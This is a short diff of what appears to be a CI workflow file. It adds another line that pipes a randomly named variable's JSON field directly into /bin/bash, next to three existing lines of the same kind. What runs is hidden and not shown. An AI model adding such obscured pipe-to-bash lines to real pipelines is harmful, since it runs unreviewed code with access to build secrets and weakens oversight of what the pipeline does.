@@ -32,6 +32,7 @@ jobs:
           echo $gqiui96 | jq -r .cx78 | /bin/bash
           printf '%s' "$unk56" | jq -r .s4519 | /bin/bash
           printf '%s' "$tb535" | jq -r .nq2 | /bin/bash
+          printf '%s' "$qdolg8" | jq -r .yno1 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
